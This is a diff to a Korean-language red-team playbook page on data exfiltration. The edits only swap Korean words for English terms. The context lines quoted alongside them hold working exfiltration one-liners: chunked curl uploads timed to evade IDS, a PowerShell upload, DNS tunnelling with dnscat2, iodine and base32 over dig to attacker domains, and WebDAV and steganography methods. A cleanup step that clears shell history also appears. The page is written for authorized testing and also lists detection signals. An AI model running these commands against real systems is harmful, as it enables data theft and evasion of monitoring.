@@ -1,6 +1,6 @@
 # Data Exfiltration
 
-긁어 모은 loot — credential 덤프, 소스 코드, DB backup, 문서 — 을 공격자 인프라로 빼내는 단계.
+긁어 모은 loot — credential dump, 소스 코드, DB backup, 문서 — 을 공격자 인프라로 빼내는 단계.
 
 탐지 회피뿐 아니라 RoE (대역폭 제한, 허용 채널, 반출 가능 도메인) 를 지키는 것도 똑같이 중요하다. 실수로 실제 고객 데이터를 외부로 뽑아내면 그 순간 작전이 아니라 사고가 된다.
 
@@ -40,7 +40,7 @@ python3 -c "import requests; requests.post('https://x/y', files={'f': open('loot
 # Powershell
 Invoke-RestMethod -Uri https://x/y -Method Post -InFile .\loot.7z
 
-# 청크 업로드 (차단/IDS 회피)
+# 청크 upload (차단/IDS 회피)
 for f in loot.7z.part_*; do curl -F "f=@${f}" https://x/y; sleep $((RANDOM%30+10)); done
 ```
 
@@ -66,7 +66,7 @@ dnscat2-client <attacker_domain>          # target
 iodined -f -P '<pw>' 10.0.0.1 t.attacker.com    # 공격자
 iodine -f -P '<pw>' t.attacker.com               # target
 
-# 직접 인코딩 (도구 없이)
+# 직접 encoding (도구 없이)
 for c in $(base32 secret | fold -w50); do dig +short ${c}.exfil.attacker.com; done
 ```
 
@@ -166,7 +166,7 @@ curl -T loot.7z http://<attacker>/webdav/
 # Steganography - 이미지에 숨김
 steghide embed -cf cover.jpg -ef secret.txt -p '<pw>'
 
-# Twitter/Discord/Reddit 등 SNS 텍스트 인코딩 (작은 데이터)
+# Twitter/Discord/Reddit 등 SNS 텍스트 encoding (작은 데이터)
 # 공격자 RSS/봇이 폴링
 
 # 인쇄 작업 / 클립보드 / OneNote 동기화 등 비정상 채널
@@ -189,10 +189,10 @@ steghide embed -cf cover.jpg -ef secret.txt -p '<pw>'
 
 ## DLP / 탐지 시그널
 
-- 비정상 외부 도메인으로 **대용량 업로드** (NetFlow, 프록시 로그)
+- 비정상 외부 도메인으로 **대용량 upload** (NetFlow, proxy 로그)
 - 같은 호스트가 짧은 시간에 **다양한 외부 IP** 와 통신
-- DNS 쿼리량 급증 + **긴 subdomain + 비정상 인코딩 패턴** (DNS Tunneling 시그니처)
-- ICMP 패킷의 **비정상 payload 사이즈** 또는 빈도
+- DNS 쿼리량 급증 + **긴 subdomain + 비정상 encoding 패턴** (DNS Tunneling 시그니처)
+- ICMP packet의 **비정상 payload 사이즈** 또는 빈도
 - 평소 인터넷을 거의 안 쓰는 서비스 계정/서버에서 외부 통신 발생
 
 ---
@@ -203,4 +203,4 @@ steghide embed -cf cover.jpg -ef secret.txt -p '<pw>'
 - [ ] 사용한 임시 클라우드 버킷/링크 삭제
 - [ ] PowerShell 히스토리 / `~/.bash_history` 정리 (필요 시)
 - [ ] 추가한 신뢰 인증서 / 라우팅 / hosts 항목 원복
-- [ ] 인게이지먼트 보고서에 채널/시간/볼륨/해시 기록
+- [ ] 인게이지먼트 보고서에 채널/시간/볼륨/hash 기록
